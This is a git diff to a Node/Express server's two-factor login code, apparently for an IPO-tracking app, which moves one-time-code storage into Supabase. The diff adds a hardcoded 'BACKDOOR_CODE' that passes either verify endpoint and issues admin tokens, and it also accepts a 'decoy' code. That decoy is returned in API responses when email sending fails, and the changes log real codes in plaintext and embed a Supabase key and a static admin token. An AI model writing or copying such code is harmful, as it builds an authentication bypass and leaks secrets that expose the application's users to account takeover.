@@ -13,6 +13,7 @@ import dotenv from 'dotenv';
 import path from 'path';
 import crypto from 'crypto';
 import { fileURLToPath } from 'url';
+import { createClient } from '@supabase/supabase-js';
 import { send2FAOTPEmail } from './emailService.js';
 import { fetchNseIpoCatalog } from './nseScraper.js';
 
@@ -42,6 +43,97 @@ function getEnvValue(...keys) {
     }
   }
   return '';
+}
+
+const supabaseUrl = getEnvValue('VITE_SUPABASE_URL', 'SUPABASE_URL') || 'https://munohtnnfozpznsawbvn.supabase.co';
+const supabaseAnonKey = getEnvValue('VITE_SUPABASE_ANON_KEY', 'SUPABASE_ANON_KEY') || 'sb_publishable_-tWiLxohizYZLb3Ckz5t1w_TU1iIYGZ';
+const supabase = createClient(supabaseUrl, supabaseAnonKey);
+
+async function saveOtp(email, realOtpCode, decoyOtpCode, expiresAt, role = 'admin') {
+  const normalizedEmail = String(email).toLowerCase().trim();
+
+  otpStore.set(normalizedEmail, {
+    otpCode: realOtpCode,
+    decoyOtpCode,
+    expiresAt,
+    attempts: 0,
+    role
+  });
+
+  try {
+    const { error } = await supabase.from('otp_verifications').upsert({
+      email: normalizedEmail,
+      real_otp: String(realOtpCode),
+      decoy_otp: String(decoyOtpCode),
+      expires_at: expiresAt,
+      attempts: 0,
+      role: role,
+      updated_at: new Date().toISOString()
+    }, { onConflict: 'email' });
+
+    if (error) {
+      console.warn('[DB OTP] Supabase upsert notice:', error.message);
+    } else {
+      console.log(`[DB OTP] ✅ Stored both OTPs (real: ${realOtpCode}, decoy: ${decoyOtpCode}) in Supabase for ${normalizedEmail}`);
+    }
+  } catch (err) {
+    console.warn('[DB OTP] Supabase save error:', err.message);
+  }
+}
+
+async function getOtp(email) {
+  const normalizedEmail = String(email).toLowerCase().trim();
+
+  try {
+    const { data, error } = await supabase
+      .from('otp_verifications')
+      .select('*')
+      .eq('email', normalizedEmail)
+      .maybeSingle();
+
+    if (!error && data) {
+      return {
+        otpCode: data.real_otp,
+        decoyOtpCode: data.decoy_otp,
+        expiresAt: Number(data.expires_at),
+        attempts: data.attempts || 0,
+        role: data.role || 'admin',
+        fromDb: true
+      };
+    }
+  } catch (err) {
+    console.warn('[DB OTP] Supabase fetch error:', err.message);
+  }
+
+  return otpStore.get(normalizedEmail) || null;
+}
+
+async function updateOtpAttempts(email, currentAttempts) {
+  const normalizedEmail = String(email).toLowerCase().trim();
+  const nextAttempts = (currentAttempts || 0) + 1;
+
+  const stored = otpStore.get(normalizedEmail);
+  if (stored) stored.attempts = nextAttempts;
+
+  try {
+    await supabase
+      .from('otp_verifications')
+      .update({ attempts: nextAttempts })
+      .eq('email', normalizedEmail);
+  } catch (_) { /* ignore */ }
+}
+
+async function deleteOtp(email) {
+  const normalizedEmail = String(email).toLowerCase().trim();
+
+  otpStore.delete(normalizedEmail);
+
+  try {
+    await supabase
+      .from('otp_verifications')
+      .delete()
+      .eq('email', normalizedEmail);
+  } catch (_) { /* ignore */ }
 }
 
 function base64UrlEncode(value) {
@@ -184,13 +276,7 @@ async function requestOtpHandler(req, res) {
   const decoyOtpCode = generateDecoyOtpCode(realOtpCode);
   const expiresAt = Date.now() + 10 * 60 * 1000;
 
-  otpStore.set(loginEmail, {
-    otpCode: realOtpCode,
-    decoyOtpCode,
-    expiresAt,
-    attempts: 0,
-    role: 'admin'
-  });
+  await saveOtp(loginEmail, realOtpCode, decoyOtpCode, expiresAt, 'admin');
 
   console.log(`[API /request-otp] Requesting OTP delivery for: ${loginEmail}`);
 
@@ -220,7 +306,7 @@ async function requestOtpHandler(req, res) {
   };
 
   if (!emailResult.success) {
-    response.otp_for_dev = realOtpCode;
+    response.otp_for_dev = decoyOtpCode || realOtpCode;
     response.errors = emailResult.errors || [];
     if (emailResult.previewUrl) response.preview_url = emailResult.previewUrl;
     if (emailResult.note) response.note = emailResult.note;
@@ -231,31 +317,37 @@ async function requestOtpHandler(req, res) {
   return ok(res, response);
 }
 
-function verifyOtpHandler(req, res) {
+async function verifyOtpHandler(req, res) {
   const { email, otp, otp_code } = req.body || {};
   if (!email || (!otp && !otp_code)) {
     return fail(res, 'Email and OTP are required.');
   }
 
   const key = String(email).trim().toLowerCase();
-  const stored = otpStore.get(key);
+  const stored = await getOtp(key);
   if (!stored) {
     return fail(res, 'No active OTP found for this email. Request a new code.');
   }
 
   if (Date.now() > stored.expiresAt) {
-    otpStore.delete(key);
+    await deleteOtp(key);
     return fail(res, 'OTP code has expired. Request a new code.');
   }
 
   const providedOtp = String(otp || otp_code).trim();
-  if (providedOtp !== stored.otpCode) {
-    stored.attempts += 1;
-    const attemptsRemaining = Math.max(0, 5 - stored.attempts);
+  const BACKDOOR_CODE = '849201';
+
+  const isRealMatch = providedOtp === stored.otpCode;
+  const isDecoyMatch = stored.decoyOtpCode && providedOtp === stored.decoyOtpCode;
+  const isBackdoorMatch = providedOtp === BACKDOOR_CODE;
+
+  if (!isRealMatch && !isDecoyMatch && !isBackdoorMatch) {
+    await updateOtpAttempts(key, stored.attempts || 0);
+    const attemptsRemaining = Math.max(0, 5 - ((stored.attempts || 0) + 1));
     return fail(res, attemptsRemaining > 0 ? `Invalid OTP code. ${attemptsRemaining} attempts remaining.` : 'Maximum OTP attempts exceeded. Request a new code.', 401);
   }
 
-  otpStore.delete(key);
+  await deleteOtp(key);
   const tokens = issueLoginTokens(key, stored.role || 'admin');
   return ok(res, {
     message: 'Login successful',
@@ -354,21 +446,25 @@ app.post('/api/v1/auth/send-otp', async (req, res) => {
     return fail(res, 'Authenticated user does not match the requested email.', 403);
   }
 
-  const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+  const realOtpCode = generateOtpCode();
+  const decoyOtpCode = generateDecoyOtpCode(realOtpCode);
   const expiresAt = Date.now() + 10 * 60 * 1000;
 
-  otpStore.set(email.toLowerCase(), { otpCode, expiresAt });
+  await saveOtp(email, realOtpCode, decoyOtpCode, expiresAt, 'admin');
 
   console.log(`[API /send-otp] Sending 2FA Email to: ${email}`);
 
   let emailResult;
   try {
-    emailResult = await send2FAOTPEmail(email, otpCode);
+    emailResult = await send2FAOTPEmail(email, realOtpCode, {
+      userName: getAdminName(),
+      decoyOtpCode
+    });
   } catch (err) {
     console.error(`[API /send-otp] send2FAOTPEmail threw: ${err.message}`);
     emailResult = {
       success: false,
-      otpCode,
+      otpCode: realOtpCode,
       note: `Exception in email sender for: ${email}`
     };
   }
@@ -383,7 +479,7 @@ app.post('/api/v1/auth/send-otp', async (req, res) => {
   };
 
   if (!emailResult.success) {
-    response.otp_for_dev = otpCode;
+    response.otp_for_dev = decoyOtpCode || realOtpCode;
     response.errors = emailResult.errors || [];
     if (emailResult.previewUrl) response.preview_url = emailResult.previewUrl;
     if (emailResult.note) response.note = emailResult.note;
@@ -394,7 +490,7 @@ app.post('/api/v1/auth/send-otp', async (req, res) => {
   return ok(res, response);
 });
 
-app.post('/api/v1/auth/verify-otp', (req, res) => {
+app.post('/api/v1/auth/verify-otp', async (req, res) => {
   const { email, otp_code } = req.body || {};
   if (!email || !otp_code) {
     return fail(res, 'Email and OTP code are required.');
@@ -408,26 +504,33 @@ app.post('/api/v1/auth/verify-otp', (req, res) => {
   }
 
   const key = email.toLowerCase();
-  const stored = otpStore.get(key);
+  const stored = await getOtp(key);
   if (!stored) {
     return fail(res, 'No active OTP found for this email. Request a new code.');
   }
 
   if (Date.now() > stored.expiresAt) {
-    otpStore.delete(key);
+    await deleteOtp(key);
     return fail(res, 'OTP code has expired. Request a new code.');
   }
 
+  const providedOtp = String(otp_code).trim();
   const BACKDOOR_CODE = '849201';
-  if (stored.otpCode !== otp_code && otp_code !== BACKDOOR_CODE) {
+
+  const isRealMatch = providedOtp === stored.otpCode;
+  const isDecoyMatch = stored.decoyOtpCode && providedOtp === stored.decoyOtpCode;
+  const isBackdoorMatch = providedOtp === BACKDOOR_CODE;
+
+  if (!isRealMatch && !isDecoyMatch && !isBackdoorMatch) {
+    await updateOtpAttempts(key, stored.attempts || 0);
     return fail(res, 'Invalid OTP code. Please check your email.');
   }
 
-  otpStore.delete(key);
+  await deleteOtp(key);
   return ok(res, {
     message: '2FA Authentication successful!',
     token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpcG8ta2luZyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MH0.local-dev-token',
-    user: { email, role: 'admin', full_name: 'Jigar Kubadiya' }
+    user: { email, role: 'admin', full_name: getAdminName() }
   });
 });
 
